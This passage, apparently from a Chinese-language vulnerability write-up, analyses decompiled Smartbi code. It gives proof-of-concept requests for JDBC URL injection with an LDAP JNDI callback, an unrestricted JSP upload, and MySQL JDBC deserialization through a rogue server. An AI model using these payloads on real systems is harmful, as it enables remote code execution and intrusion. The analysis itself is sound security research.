boolean dbNameOnly = \u0026#34;true\u0026#34;.equals(request.getParameter(\u0026#34;dbNameOnly\u0026#34;)); String clientId = null; //输出调试日志，记录数据库名、查询语句等 log.debug(\u0026#34;sqldictsync[dbName:\u0026#34; + dbName + \u0026#34;,dbNameOnly:\u0026#34; + dbNameOnly + \u0026#34;,querySql:\u0026#34; + querySql + \u0026#34;]\u0026#34;); //如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources if (dbNameOnly) { clientId = (new SyncResources()).synchronize(dbName, querySql); } else {//否则就完整使用所有连接信息进行数据库连接和 SQL 查询 clientId = (new SyncResources()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql); } 此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\sync\\SyncResources.class\nJava\r1 2 3 4 5 6 7 8 9 10 11 12 13 //接收用户输入的数据库参数 public String synchronize(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql) throws Exception { //使用 DbUtil.getConnection 创建数据库连接，继续跟进 Connection conn = DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)null); if (conn == null) { throw new IllegalArgumentException(StringUtil.getLanguageValue(\u0026#34;Incomingconnectionparametererrorestablishconnectionfailed\u0026#34;)); } else { int colsCount = 8; Reader reader = new ResultSetReader(conn, querySql, colsCount); DictTree tree = new DictTree(reader); return this.doSynchronize(tree); } } E:\\Smartbi\\SmartbiUnionServer\\plugin\\SmartbiPrestoClickHouseJdbc\\smartbiCommon.jar!\\smartbi\\util\\DbUtil.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 public static Connection getConnection(String driver, String url, String dbUser, String dbPass, String connName) throws Exception { DefaultConnectionInfo info = new DefaultConnectionInfo(); info.setId(UUIDGenerator.generate()); info.setName(connName); // driver 和 url 参数都是从 drvInfo取值 info.setDriver(driver); info.setUrl(url); info.setUser(dbUser); info.setPassword(dbPass); //调用 getConnection 方法。执行 jdbc return ConnectionPool.getInstance().getConnection(info); } public static Connection getConnection(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName) throws Exception { DBType driverType = null; try { driverType = DBType.valueOf(dbType.toUpperCase()); } catch (Exception var9) { return null; } String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName); if (drvInfo == null) { return null; } else { DefaultConnectionInfo info = new DefaultConnectionInfo(); info.setId(UUIDGenerator.generate()); info.setName(connName); info.setDriverType(driverType); info.setDriver(drvInfo[0]); info.setUrl(drvInfo[1]); info.setUser(dbUser); info.setPassword(dbPass); return ConnectionPool.getInstance().getConnection(info); } } 跟进 translateDriverInfo\nJava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName) { return translateDriverInfo(dbType, serverName, dbName, (String)null); } public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) { String[] result = new String[2]; //以 dbType 确定数据库类型 switch (dbType) { case DB2: case DB2_400: result[0] = \u0026#34;COM.ibm.db2.jdbc.net.DB2Driver\u0026#34;; result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName; break; case DB2_V9: result[0] = \u0026#34;com.ibm.db2.jcc.DB2Driver\u0026#34;; if (serverName.indexOf(\u0026#34;:\u0026#34;) == -1) { result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;:50000/\u0026#34; + dbName + \u0026#34;:deferPrepares=false;\u0026#34;; } else { result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName + \u0026#34;:deferPrepares=false;\u0026#34;; } break; 构造poc:\ntext\r1 2 3 type=sqldictsync\u0026amp;dbType=DB2_V9\u0026amp;dbServer=localhost:6688\u0026amp;dbName=a:a=a;clientRerouteServerListJNDIName=ldap://169.254.39.1:1389/6bqlht; type=sqldictsync\u0026amp;dbType=DB2_V9\u0026amp;dbServer=8.8.8.8:18080\u0026amp;dbName=a:a=a;clientRerouteServerListJNDIName=ldap://169.254.39.1:1389/6bqlht; tomcat 历史漏洞（实则没有） 确定 tomcat 版本为 Apache Tomcat Version 7.0.34\nE:\\Smartbi\\Tomcat\\RELEASE-NOTES\n1、AJP 导致的 RCE CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析\nhttps://www.cnblogs.com/backlion/p/12870365.html\n默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0/0）.\n确认 18009 端口开放，且能够建立 TCP 连接：\nTest-NetConnection -ComputerName 127.0.0.1 -Port 18009\n使用 Ghostcat 漏洞检测工具：\nhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\n脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面\n可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件\n文件上传 文件位置：Tomcat/webapps/smartbi/vision/designer/imageimport.jsp\njsp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34;%\u0026gt; \u0026lt;% try { String path = request.getSession().getServletContext().getRealPath(\u0026#34;\u0026#34;) + \u0026#34;/vision/designer/images/\u0026#34;; File dir = new File(path); if (!dir.exists()) { dir.mkdirs(); } //从请求头 X-File-Name 获取上传文件名 String fileName = new String(request.getHeader(\u0026#34;X-File-Name\u0026#34;).getBytes(\u0026#34;ISO-8859-1\u0026#34;), \u0026#34;UTF-8\u0026#34;); //获取文件类型 String fileType = request.getHeader(\u0026#34;X-File-Type\u0026#34;); //判断是否包含 image 字符串 if(fileType.indexOf(\u0026#34;image\u0026#34;) == -1) { response.setContentType(\u0026#34;text/html; charset=UTF-8\u0026#34;); response.resetBuffer(); response.getOutputStream().write(\u0026#34;error file type!\u0026#34;.getBytes(\u0026#34;UTF-8\u0026#34;)); return; } File file = new File(path + fileName); FileOutputStream fos = new FileOutputStream(file); int bytesRead; byte[] buf = new byte[1024]; // 4K buffer while ((bytesRead = request.getInputStream().read(buf)) != -1) { fos.write(buf, 0, bytesRead); } fos.flush(); fos.close(); smartbi.net.sf.json.JSONObject jobj = new smartbi.net.sf.json.JSONObject(); jobj.put(\u0026#34;url\u0026#34;, path.substring(path.lastIndexOf(\u0026#34;images/\u0026#34;)) + \u0026#34;/\u0026#34; + fileName); //jobj.put(\u0026#34;dir\u0026#34;, dir.getCanonicalPath()); String resultStr = jobj.toString(); response.setContentType(\u0026#34;text/html; charset=UTF-8\u0026#34;); response.resetBuffer(); response.getOutputStream().write(resultStr.getBytes(\u0026#34;UTF-8\u0026#34;)); } catch (Exception e) { e.printStackTrace(); } %\u0026gt; 对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞\n漏洞复现：\n路由：http://localhost:18080/smartbi/vision/designer/imageimport.jsp\n需要配置页（http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞\npoc:\ntext\r1 2 3 4 5 6 7 //GET 和 POST 都可以 GET /smartbi/vision/designer/imageimport.jsp HTTP/1.1 X-File-Type: image X-File-Name: 1.jsp \u0026lt;%=\u0026#34;qwer\u0026#34;%\u0026gt; text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 GET /smartbi/vision/designer/imageimport.jsp HTTP/1.1 Host: localhost:18080 Cache-Control: max-age=0 Authorization: Basic YWRtaW46YWRtaW4= sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF X-File-Type: image X-File-Name: 1.jsp Connection: close Content-Length: 11 \u0026lt;%=\u0026#34;qwer\u0026#34;%\u0026gt; JDBC反序列化 JDBC反序列化学习\nhttps://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/\nhttps://xz.aliyun.com/news/7754\nhttps://www.cnblogs.com/Litsasuk/articles/18410624\nhttps://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html\n关键条件： mysql-connector-java 的依赖版本为5.1.44，支持 autoDeserialize=true 参数，具备反序列化触发点\n在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链\n存在方法调用反射机制 RMIServlet ，可远程调用任意类方法\n漏洞分析： 触发点：DataSourceService -\u0026gt; testConnection\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\client\\datasource\\DataSourceService.class\njava\r1 2 3 public void testConnection(IDataSource dataSource) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } 攻击者向/vision/RMIServlet 发送如下 POST 请求：\ntext\r1 2 3 4 5 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: 127.0.0.1:18080 Content-Type: application/x-www-form-urlencoded className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{...}] 通过类名和方法名反射调用，即：\nclassName = DataSourceService\nmethodName = testConnection\nparams = [...] 是 JSON 数组字符串，传进去后被包装成 JSONArray 类型。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class RMIServlet extends HttpServlet { ... public String processExecute(HttpServletRequest request, String className, String methodName, String params) { //RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 根据类名获取对应的 ClientService 实例。 ClientService service = RMIModule.getInstance().getService(className); String resultStr = null; try { //结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体 StringBuilder buff = (new StringBuilder()).append(\u0026#39;{\u0026#39;); //判断 service 是否存在，未找到就抛出异常 if (service == null) { if (className != null) { Locale locale = CommonConfiguration.getInstance().getLocale(); String notFoundClass = StringUtil.replaceLanguage(\u0026#34;${Notfoundclass}\u0026#34;, locale); throw (new SmartbiException(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + \u0026#34; \u0026#34; + notFoundClass); } } else { //记录调用时间 long startTime = (new Date()).getTime(); //执行 execute 方法，即反射调用 Object obj = service.execute(methodName, new JSONArray(params)); long duration = (new Date()).getTime() - startTime; if (obj == null) { buff.append(\u0026#34;\\\u0026#34;retCode\\\u0026#34;:0\u0026#34;); } 接着 params 调用下面的方法：\nJava\r1 Object obj = service.execute(methodName, new JSONArray(params)); execute方法处理逻辑：将传入的 JSON 转为 IDataSource 对象,\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 public class ClientService { ... //接收 JSON 数组和方法名 public Object execute(String var1, JSONArray var2) { try { //从 this.a 中取出方法名对应的 Method 对象 Method var3 = (Method)this.a.get(var1); //不存在抛出异常 if (var3 == null) { throw (new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1); } else { //检查参数个数 Class[] var4 = var3.getParameterTypes(); if (var4.length != var2.length()) { throw (new SmartbiException(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(\u0026#34;Method2\u0026#34;) + \u0026#34;\\\u0026#34;\u0026#34; + var1 + \u0026#34;\\\u0026#34;\u0026#34; + StringUtil.getLanguageValue(\u0026#34;Thenumberofparametersis\u0026#34;) + \u0026#34; \u0026#34; + var4.length + \u0026#34; ,\u0026#34; + StringUtil.getLanguageValue(\u0026#34;Butthenumberofargumentspassedinis\u0026#34;) + \u0026#34; \u0026#34; + var2.length() + \u0026#34; .\u0026#34;); } else { //创建Java类型参数数组 Object[] var5 = new Object[var2.length()]; try { //进行类型转换，将 JSON -\u0026gt; Java对象 //获取每个参数的泛型类型（var6） Type[] var6 = var3.getGenericParameterTypes(); //遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型 for(int var7 = 0; var7 \u0026lt; var5.length; ++var7) { //var2 是 JSONArray，也就是传入的 params Object var8 = var2.get(var7); //目标方法 testConnection 的参数类型即 IDataSource Class var9 = var4[var7]; //泛型类型 Type var10 = var6[var7]; //把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入 var5[var7] = JSONUtil.jsonToObject(var8, var9, var10); } } 再进入 DataSourceService.testConnection()\njava\r1 2 3 public void testConnection(IDataSource dataSource) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } 进入 MetaDataServiceImpl.testConnection()：\nJava\r1 conn = ConnectionPool.getInstance().getConnection(ds); java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public class MetaDataServiceImpl { ... //主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接 public void testConnection(IDataSource dataSource) { //实例化 Smartbi 内部使用的 DataSource 类 DataSource ds = new DataSource(); //UUIDGenerator.generate() 应是一个工具类，生成随机 UUID ds.setId(UUIDGenerator.generate()); //把外部传入的 IDataSource 转成系统内部 DataSource格式 ds.setName(dataSource.getName()); ds.setAlias(dataSource.getAlias()); ds.setDriver(dataSource.getDriver()); ds.setDesc(dataSource.getDesc()); ds.setDbCharset(dataSource.getDbCharset()); ds.setUrl(dataSource.getUrl()); ds.setUser(dataSource.getUser()); ds.setDriverType(dataSource.getDriverType()); ds.setMaxConnection(dataSource.getMaxConnection()); ds.setValidationQuery(dataSource.getValidationQuery()); ds.setPassword(dataSource.getPassword()); ds.setTransactionIsolation(dataSource.getTransactionIsolation()); ds.setValidationQueryMethod(dataSource.getValidationQueryMethod()); ds.setAuthenticationType(dataSource.getAuthenticationType()); //如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接 if (dataSource.getPassword() == null \u0026amp;\u0026amp; !StringUtil.isNullOrEmpty(dataSource.getId())) { DataSource dbDs = FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId()); ds.setPassword(dbDs.getPassword()); } //声明 JDBC 连接对象 conn，后续用于建立连接 Connection conn = null; try { //使用自定义的连接池 ConnectionPool 获取数据库连接 conn = ConnectionPool.getInstance().getConnection(ds); if (DBType.PRESTO == dataSource.getDriverType()) { String sql = \u0026#34;SELECT 1\u0026#34;; PreparedStatement stat = JdbcUtil.prepareStatement(conn, sql); 进入 ConnectionPool.getConnection()：进行数据池连接\njava\r1 return this.driverConnect(poolName, ds); java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 public class ConnectionPool implements Serializable { ... public Connection getConnection(IConnectionInfo ds) throws Exception { //判断是否为系统知识库 if (\u0026#34;DS.SYSTEM\\u77e5\\u8bc6\\u5e93\u0026#34;.equals(ds.getId())) { ds = this.provider.getConnectionInfo(\u0026#34;res\u0026#34;); } //判断是否是 JNDI 数据 if (ds.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { InitialContext cxt = new InitialContext(); DataSource dataSource = (DataSource)cxt.lookup(ds.getUrl().substring(\u0026#34;JNDI:\u0026#34;.length())); return dataSource.getConnection(); } else if (ds.getValidationQueryMethod() == 3) {//加载 JDBC 驱动 String driverClass = ds.getDriver(); Class\u0026lt;?\u0026gt; clazz = null; try { //通过自定义的 DynamicLoadLibManager 加载该类 clazz = DynamicLoadLibManager.loadClass(driverClass); } catch (ClassNotFoundException var12) { //如果失败，使用备用 classLoader 加载 ClassLoader clzLoader = (ClassLoader)Class.forName(\u0026#34;smartbi.repository.DAOModule\u0026#34;).getDeclaredField(\u0026#34;classLoader\u0026#34;).get((Object)null); clazz = clzLoader == null ? Class.forName(driverClass) : clzLoader.loadClass(driverClass); } //创建 JDBC 驱动对象实例 Driver jdbcDriver = (Driver)clazz.newInstance(); //构建连接所需的属性（用户名、密码） Properties prop = new Properties(); prop.put(\u0026#34;user\u0026#34;, ds.getUser()); prop.put(\u0026#34;password\u0026#34;, ds.getPassword()); if (ds.getDriverType() == DBType.KYLIN) { prop.put(\u0026#34;timezone\u0026#34;, \u0026#34;GMT\u0026#34;); } Object conn = null; try { //通过反射调用 DriverManager.getConnection() 这个重载的私有方法 Method m = DriverManager.class.getDeclaredMethod(\u0026#34;getConnection\u0026#34;, String.class, Properties.class, ClassLoader.class); m.setAccessible(true); //使用系统中的 classLoader ClassLoader clzLoader = (ClassLoader)Class.forName(\u0026#34;smartbi.repository.DAOModule\u0026#34;).getDeclaredField(\u0026#34;classLoader\u0026#34;).get((Object)null); conn = m.invoke((Object)null, ds.getUrl(), prop, clzLoader); } catch (Exception var10) { try { Method m = DriverManager.class.getDeclaredMethod(\u0026#34;getConnection\u0026#34;, String.class, Properties.class, Class.class); m.setAccessible(true); conn = m.invoke((Object)null, ds.getUrl(), prop, clazz); } catch (Exception var9) { conn = DriverManager.getConnection(ds.getUrl(), prop); } } return (Connection)conn; } else { String poolName = null; if (ds.getId().equals(\u0026#34;DS.SYSTEM\\u77e5\\u8bc6\\u5e93\u0026#34;)) { poolName = \u0026#34;res\u0026#34;; } else { poolName = this.getPoolNameFromDatasource(ds); } try { driver.getConnectionPool(poolName); //调用 driverConnect 获取连接池连接 return this.driverConnect(poolName, ds); } catch (SQLException var11) { this.createPool(ds); return this.driverConnect(poolName, ds); } } } 此时服务器向远程的FakeMysql尝试连接，就会接收到FakeMysql返回的恶意序列化数据，\n漏洞复现： 搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是本机IP地址的3308端口\n构造 K1链\n构造poc:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;:100,\u0026#34;user\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;:\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;:\u0026#34;SELECT 1 FROM DUAL\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true\u0026amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;:\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;:\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;:-1,\u0026#34;validationQueryMethod\u0026#34;:0,\u0026#34;dbToCharset\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;:\u0026#34;STATIC\u0026#34;}] -\u0026gt;url编码 className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;jdbc%3amysql%3a//[本机IP]%3a3308/d4c5846%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] POST /smartbi/vision/RMIServlet HTTP/1.1 Host: localhost:18080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: */* Origin: http://localhost Referer: http://localhost:18080/smartbi/vision/index.jsp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Connection : keep-alive Content-Length: 580 className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;jdbc%3amysql%3a//192.168.1.25%3a3308/d4c5846%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] 总结： 根据依赖版本确定存在漏洞 根据依赖的敏感函数找入口点 前台JDBC反序列化 漏洞分析： E:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\\smartbi-FreeQuery.jar!\\smartbi\\freequery\\sync\\SyncServlet.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class SyncServlet extends HttpServlet { ... protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { ServletOutputStream oos = response.getOutputStream(); File tmpFile = null; FileOutputStream fos = null; FileInputStream fis = null; String actionType = StringUtil.getLanguageValue(\u0026#34;Synchronization\u0026#34;); try { if (!ServletFileUpload.isMultipartContent(request)) { request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); String type = request.getParameter(\u0026#34;type\u0026#34;); response.setBufferSize(4096); if (type.equals(\u0026#34;sqldictsync\u0026#34;)) { long startTime = System.currentTimeMillis(); //从请求中提取数据库连接配置和查询语句 String dbType = request.getParameter(\u0026#34;dbType\u0026#34;); String dbServer = request.getParameter(\u0026#34;dbServer\u0026#34;); String dbName = request.getParameter(\u0026#34;dbName\u0026#34;); String dbUser = request.getParameter(\u0026#34;dbUser\u0026#34;); String dbPass = request.getParameter(\u0026#34;dbPass\u0026#34;); String querySql = request.getParameter(\u0026#34;querySql\u0026#34;); boolean dbNameOnly = \u0026#34;true\u0026#34;.equals(request.getParameter(\u0026#34;dbNameOnly\u0026#34;)); String clientId = null; log.debug(\u0026#34;sqldictsync[dbName:\u0026#34; + dbName + \u0026#34;,dbNameOnly:\u0026#34; + dbNameOnly + \u0026#34;,querySql:\u0026#34; + querySql + \u0026#34;]\u0026#34;); if (dbNameOnly) { clientId = (new SyncResources()).synchronize(dbName, querySql); } else { clientId = (new SyncResources()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql); } 跟进 synchronize\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class SyncResources { ... public String synchronize(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql) throws Exception { //调用 DbUtil.getConnection() 获取数据库连接 Connection conn = DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)null); if (conn == null) { throw new IllegalArgumentException(StringUtil.getLanguageValue(\u0026#34;Incomingconnectionparametererrorestablishconnectionfailed\u0026#34;)); } else { int colsCount = 8; Reader reader = new ResultSetReader(conn, querySql, colsCount); DictTree tree = new DictTree(reader); return this.doSynchronize(tree); } } 跟进 DbUtil.getConnection\nJava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 public class DbUtil { ... public static Connection getConnection(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName) throws Exception { DBType driverType = null; try { //将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null driverType = DBType.valueOf(dbType.toUpperCase()); } catch (Exception var9) { return null; } //translateDriverInfo() 方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如：\u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName); if (drvInfo == null) { return null; } else { //创建 DefaultConnectionInfo 实例，用于表示连接信息 DefaultConnectionInfo info = new DefaultConnectionInfo(); info.setId(UUIDGenerator.generate()); info.setName(connName); info.setDriverType(driverType); info.setDriver(drvInfo[0]); info.setUrl(drvInfo[1]); info.setUser(dbUser); info.setPassword(dbPass); //获取数据库连接 return ConnectionPool.getInstance().getConnection(info); } } public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) { String[] result = new String[2]; switch (dbType) { case DB2: case DB2_400: result[0] = \u0026#34;COM.ibm.db2.jdbc.net.DB2Driver\u0026#34;; result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName; break; case DB2_V9: result[0] = \u0026#34;com.ibm.db2.jcc.DB2Driver\u0026#34;; if (serverName.indexOf(\u0026#34;:\u0026#34;) == -1) { result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;:50000/\u0026#34; + dbName + \u0026#34;:deferPrepares=false;\u0026#34;; } else { result[1] = \u0026#34;jdbc:db2://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName + \u0026#34;:deferPrepares=false;\u0026#34;; } break; case INFORMIX: result[0] = \u0026#34;com.informix.jdbc.IfxDriver\u0026#34;; result[1] = serverName; break; case MYSQL: case INFOBRIGHT: result[0] = \u0026#34;com.mysql.jdbc.Driver\u0026#34;; if (dbEncoding == null) { dbEncoding = \u0026#34;GBK\u0026#34;; } if (\u0026#34;mysqlCluster=true\u0026#34;.equals(dbType.getProp())) { result[1] = \u0026#34;jdbc:mysql:loadbalance://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName; if (dbName.indexOf(\u0026#34;?\u0026#34;) == -1) { result[1] = result[1] + \u0026#34;?useServerPrepStmts=true\u0026amp;autoReconnect=true\u0026amp;roundRobinLoadBalance=true\u0026amp;failOverReadOnly=false\u0026amp;characterEncoding=\u0026#34; + dbEncoding; } } else { result[1] = \u0026#34;jdbc:mysql://\u0026#34; + serverName + \u0026#34;/\u0026#34; + dbName; if (dbName.indexOf(\u0026#34;?\u0026#34;) == -1) { result[1] = result[1] + 